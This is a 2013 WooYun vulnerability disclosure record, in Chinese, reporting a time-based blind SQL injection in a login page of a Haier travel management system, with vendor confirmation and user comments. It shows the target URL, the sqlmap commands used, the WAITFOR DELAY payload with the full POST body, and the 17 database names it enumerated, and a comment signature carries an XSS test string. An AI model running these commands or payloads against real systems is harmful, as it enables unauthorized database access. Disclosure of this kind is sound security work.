{"id": 7156, "wybug_id": "wooyun-2013-042426", "wybug_title": "海尔某系统POST注入第二弹", "wybug_corp": "海尔集团", "wybug_author": "Mutoubug", "wybug_date": "2013-11-12 18:50", "wybug_open_date": "2013-12-27 18:51", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-27：\t细节向公众公开  简要描述： 问题一样，但是过程有点蛋疼。 详细说明：  存在问题的系统：http://travel.haier.com:80/travel/manager/ReLogin.aspx 依然是登陆框，提交admin'，出现错误回显了：\n\n爆物理路径了：\n\n然后抓包保存到haier.txt到sqlmap里面去跑，（使用--data的方法跑不出来的，尝试了好多次都不行）。然后百度了一下用上面的方法来跑可以跑出来是注入点，但是跑不出来库，朋友说是网络问题？然后等到早上网络比较好的时候再跑了一次，问题还是这样。。之前的语句是这样：sqlmap.py -r haierpost.txt -p TextBox1 --tables --time-sec=20 --technique=T后面各种尝试各种奇葩的SQLMAP的参数，最后把--tables改一下就成功了，真的蛋疼：sqlmap.py -r haierpost.txt -p TextBox1 --dbs --time-sec=20 --technique=T话说--time-sec这个参数是什么用的？然后就是盲注过程了，非常的漫长，结果：\n\n总共17个数据库：sqlmap identified the following injection points with a total of 34 HTTP(s) requests:---Place: POSTParameter: TextBox1    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __LASTFOCUS=&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKLTI1MTQ3MzU2MWRkl28gi/VU56MiPf/1Ncc8lnwLALs=&__EVENTVALIDATION=/wEWBQKexuSzBALs0bLrBgLs0fbZDALs0Yq1BQLHyfnnAgb4y43LUN9z/MGbBAiXth1qXSO3&TextBox1=admin' WAITFOR DELAY '0:0:20'--&TextBox2=admin&TextBox3=5391&btLogin=%B5%C7%C2%BC---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005available databases [17]:[*] [m\\\\?81xb][*] [tempdb߿][*] Back_Travel[*] ExhibitionsManagement[*] gobak[*] GOPSf[*] GOPSWGG[*] lumigent[*] master[*] moda[*] msdb[*] mwdb[*] PTMS[*] SBCBFX[*] Travel[*] VioCard[*] xiechengDB我实在不想跑表了，太慢了。就这样了。   漏洞证明：  总共17个数据库：sqlmap identified the following injection points with a total of 34 HTTP(s) requests:---Place: POSTParameter: TextBox1    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __LASTFOCUS=&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKLTI1MTQ3MzU2MWRkl28gi/VU56MiPf/1Ncc8lnwLALs=&__EVENTVALIDATION=/wEWBQKexuSzBALs0bLrBgLs0fbZDALs0Yq1BQLHyfnnAgb4y43LUN9z/MGbBAiXth1qXSO3&TextBox1=admin' WAITFOR DELAY '0:0:20'--&TextBox2=admin&TextBox3=5391&btLogin=%B5%C7%C2%BC---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005available databases [17]:[*] [m\\\\?81xb][*] [tempdb߿][*] Back_Travel[*] ExhibitionsManagement[*] gobak[*] GOPSf[*] GOPSWGG[*] lumigent[*] master[*] moda[*] msdb[*] mwdb[*] PTMS[*] SBCBFX[*] Travel[*] VioCard[*] xiechengDB   修复方案：  1.过滤登陆框的参数。2.或者用AJAX返回错误参数。3.求rank.   版权声明：转载请注明来源 Mutoubug@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-11-16 23:14 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-16 23:30 |    \t\tMutoubug \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:16        | <script>alert(wooyun);</script>)\t\t \n  @海尔集团 @xsser 我的上一个海尔的洞( WooYun: 海尔某分站SQLpost注入一枚（大量数据） )比这个明显多了，数据还跑得快，还是sa，怎么就忽略呢。。    \n     2013-11-16 23:39 |    \t\t未来还没来 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 每个人都期望成为主角，却不知道世界上从来...)\t\t \n  让我想起了海尔兄弟    \n     2013-11-17 20:00 |    \t\tbig、face \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:36        | |上天请赐我一个洞|想要一件乌云衣服|)\t\t \n  犀利..    \n     2013-12-17 10:12 |    \t\t未来还没来 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 每个人都期望成为主角，却不知道世界上从来...)\t\t \n  让我想起了太阳之子    \n     2013-12-17 19:06 |    \t\tMutoubug \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:16        | <script>alert(wooyun);</script>)\t\t \n  @未来还没来 额。。你咋想起这么多。。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}